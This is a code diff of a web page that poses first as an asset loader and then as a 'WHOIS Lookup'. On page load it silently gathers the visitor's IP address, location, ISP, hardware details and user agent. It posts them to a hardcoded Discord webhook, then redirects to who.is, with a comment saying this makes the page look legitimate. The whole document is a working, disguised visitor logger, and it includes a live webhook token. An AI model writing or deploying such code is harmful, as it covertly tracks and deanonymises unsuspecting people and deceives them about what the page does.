@@ -2,66 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading Assets...</title>
+    <title>WHOIS Lookup - Verifying...</title>
     <style>
-        body { background: #0b0b0b; color: #444; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 2px solid #222; border-top: 2px solid #555; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 15px; font-size: 12px; letter-spacing: 1px; }
+        body { 
+            background: #0a0a0a; 
+            color: #00ff41; /* Classic Matrix/Terminal Green */
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .terminal-text {
+            border-right: 2px solid #00ff41;
+            white-space: nowrap;
+            overflow: hidden;
+            animation: typing 2s steps(30, end), blink .75s step-end infinite;
+        }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink { from, to { border-color: transparent } 50% { border-color: #00ff41 } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>SYNCHRONIZING...</p>
+    <div class="terminal-text">QUERYING DATABASE: [WHOIS_REQUEST]...</div>
+    <p style="font-size: 10px; color: #008f11;">Status: Fetching packets...</p>
 
     <script>
-        async function captureAdvanced() {
+        async function runWhois() {
             try {
-                // 1. Get the IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+                // 1. IP and Location Check (via external API for more detail)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
 
-                // 2. Gather Hardware Specs
-                const info = {
-                    ip: ipData.ip,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
-                    screen: screen.width + "x" + screen.height,
-                    language: navigator.language,
-                    time: new Date().toLocaleString()
-                };
+                // 2. Format the message for Discord like a WHOIS entry
+                const whoisEntry = `
+\`\`\`yaml
+[ WHOIS DATA REPORT ]
+-----------------------------------
+IP ADDRESS : ${data.ip}
+CITY       : ${data.city}
+REGION     : ${data.region}
+COUNTRY    : ${data.country_name}
+ISP        : ${data.org}
+-----------------------------------
+HARDWARE   : ${navigator.platform}
+CORES      : ${navigator.hardwareConcurrency}
+RESOLUTION : ${screen.width}x${screen.height}
+TIMESTAMP  : ${new Date().toISOString()}
+-----------------------------------
+USER AGENT : ${navigator.userAgent}
+\`\`\``;
 
-                // 3. Send to Discord
-                await fetch("https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr", {
+                // 3. Send to your Webhook
+                const webhookURL = "https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";
+
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: "System Logger",
-                        embeds: [{
-                            title: "🚨 New Connection Logged",
-                            color: 16711680, // Red color
-                            fields: [
-                                { name: "IP Address", value: "`" + info.ip + "`", inline: true },
-                                { name: "Platform", value: info.platform, inline: true },
-                                { name: "CPU Cores", value: info.cores.toString(), inline: true },
-                                { name: "Est. RAM", value: info.ram, inline: true },
-                                { name: "Resolution", value: info.screen, inline: true },
-                                { name: "Local Time", value: info.time, inline: false }
-                            ],
-                            footer: { text: "User Agent: " + navigator.userAgent }
-                        }]
+                        username: "WHOIS-NODE-SYSTEM",
+                        content: whoisEntry
                     })
                 });
+
             } catch (e) { }
 
-            // 4. Redirect to a "safe" page after data is sent
+            // 4. Redirect to a real Whois site so it looks legitimate
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1500);
+                window.location.href = "https://who.is";
+            }, 2500);
         }
 
-        captureAdvanced();
+        runWhois();
     </script>
 </body>
 </html>
